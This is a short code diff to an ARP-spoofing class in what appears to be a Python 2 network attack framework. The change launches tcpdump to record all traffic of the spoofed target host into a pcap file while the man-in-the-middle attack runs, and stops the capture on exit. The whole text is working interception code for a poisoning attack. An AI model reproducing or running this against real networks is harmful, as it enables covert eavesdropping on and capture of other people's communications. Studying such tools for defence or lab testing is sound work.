@@ -24,7 +24,12 @@ class ArpSpoof(GenericAttack):
     def respoofer(self, targetIP, victim):
         """ Respoof the target every two seconds.
         """
+        filename = 'results/' + self.device['time'] + '_arp_cap.pcap'
         self.enable_packet_forwarding()
+        if self.config['tcpdump']:
+            global proc
+            proc = subprocess.Popen(['tcpdump', 'host', targetIP, '-w',
+                                  filename], stdout=subprocess.PIPE)
         try:
             while self.running:
                 print(self.running)
@@ -33,9 +38,15 @@ class ArpSpoof(GenericAttack):
 
             self.restoreARP(targetIP, victim)
             self.disable_packet_forwarding()
+            if self.config['tcpdump']:
+                global proc
+                proc.send_signal(subprocess.signal.SIGTERM)
         except Exception, j:
             self.restoreARP(targetIP, victim)
             self.disable_packet_forwarding()
+            if self.config['tcpdump']:
+                global proc
+                proc.send_signal(subprocess.signal.SIGTERM)
 
     # enables packet forwarding by interacting with the proc filesystem
     def enable_packet_forwarding(self):
